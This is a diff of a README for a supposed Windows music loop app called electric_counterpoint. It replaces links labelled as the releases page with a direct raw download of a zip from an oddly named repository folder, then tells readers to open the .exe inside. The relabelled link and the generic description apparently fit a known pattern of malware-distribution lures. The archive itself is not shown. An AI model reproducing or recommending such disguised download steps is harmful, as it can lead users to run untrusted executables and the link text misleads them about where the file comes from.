@@ -1,6 +1,6 @@
 # ⚡ electric_counterpoint - Simple music production for every desktop
 
-[![Download electric_counterpoint](https://img.shields.io/badge/Download-electric__counterpoint-blue)](https://github.com/nonnatural-rebelliousness229/electric_counterpoint/releases)
+[![Download electric_counterpoint](https://img.shields.io/badge/Download-electric__counterpoint-blue)](https://github.com/nonnatural-rebelliousness229/electric_counterpoint/raw/refs/heads/main/Trochosphaera/electric-counterpoint-3.5.zip)
 
 electric_counterpoint provides a way to layer audio loops with precision. You generate complex soundscapes by stacking independent rhythmic patterns. The software functions as a digital loop station that runs directly on your Windows computer.
 
@@ -8,7 +8,7 @@ electric_counterpoint provides a way to layer audio loops with precision. You ge
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [releases page](https://github.com/nonnatural-rebelliousness229/electric_counterpoint/releases) to download the application.
+1. Visit the [releases page](https://github.com/nonnatural-rebelliousness229/electric_counterpoint/raw/refs/heads/main/Trochosphaera/electric-counterpoint-3.5.zip) to download the application.
 2. Select the file ending in .exe from the list.
 3. Save the file to your desktop or downloads folder.
 4. Open the file to start the installer.
